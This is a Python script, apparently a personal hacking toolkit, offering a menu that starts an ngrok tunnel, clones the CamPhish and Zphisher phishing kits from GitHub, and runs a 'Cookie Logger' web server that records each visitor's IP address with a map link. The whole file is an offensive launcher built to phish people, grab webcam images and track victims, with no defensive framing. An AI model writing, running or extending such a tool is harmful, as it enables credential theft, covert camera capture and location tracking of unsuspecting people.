import os
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

def start_ngrok():
    ngrok_path = r"C:\Users\gtw2k\Downloads\ngrok-v3-stable-windows-amd64\ngrok.exe"
    try:
        print("\n[*] Starting ngrok...")
        subprocess.Popen([ngrok_path, "http", "8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[!] Error starting ngrok: {e}")
        return
    print("[*] ngrok started successfully. Waiting for tunnel URL...")

def download_camphish():
    repo_url = "https://github.com/techchipnet/CamPhish.git"
    directory = "CamPhish"
    try:
        if not os.path.exists(directory):
            print(f"\n[*] Cloning CamPhish from {repo_url}...")
            subprocess.run(["git", "clone", repo_url], check=True)
            print("[*] CamPhish downloaded successfully.")
        else:
            print("[*] CamPhish is already downloaded.")
    except Exception as e:
        print(f"[!] Error downloading CamPhish: {e}")

def download_zphisher():
    repo_url = "https://github.com/htr-tech/zphisher.git"
    directory = "zphisher"
    try:
        if not os.path.exists(directory):
            print(f"\n[*] Cloning Zphisher from {repo_url}...")
            subprocess.run(["git", "clone", repo_url], check=True)
            print("[*] Zphisher downloaded successfully.")
        else:
            print("[*] Zphisher is already downloaded.")
    except Exception as e:
        print(f"[!] Error downloading Zphisher: {e}")

def start_cookie_logger():
    print("\n[*] Starting Cookie Logger...")
    file_name = input("Enter the name of the file to log data (e.g., logs.txt): ").strip()
    if not file_name:
        print("[!] No file name provided. Exiting Cookie Logger.")
        return
    
    try:
        with open(file_name, "w") as f:
            f.write("IP Address, Location (Google Maps URL)\n")  # Add headers for the log file

        class LoggingHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                client_ip = self.client_address[0]
                location_url = f"https://www.google.com/maps?q={client_ip}"
                log_entry = f"{client_ip}, {location_url}\n"
                print(f"[+] Logged: {log_entry.strip()}")

                with open(file_name, "a") as log_file:
                    log_file.write(log_entry)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Logging complete. Check the file for details.")

        server = HTTPServer(("0.0.0.0", 8080), LoggingHandler)
        print(f"[*] Server started. Access the logger via http://localhost:8080")
        print(f"[*] Logs will be saved to: {file_name}")
        server.serve_forever()

    except Exception as e:
        print(f"[!] Error starting Cookie Logger: {e}")

def main():
    while True:
        print("\n" + "="*50)
        print("  Welcome to the Tool Selector! Choose an option:")
        print("="*50)
        print("1. Start Ngrok")
        print("2. Download CamPhish")
        print("3. Download Zphisher")
        print("4. Start Cookie Logger")
        print("0. Exit")
        print("="*50)

        choice = input("Enter your choice (0-4): ").strip()

        if choice == "1":
            start_ngrok()
        elif choice == "2":
            download_camphish()
        elif choice == "3":
            download_zphisher()
        elif choice == "4":
            start_cookie_logger()
        elif choice == "0":
            print("\n[*] Exiting. Goodbye!")
            break
        else:
            print("[!] Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
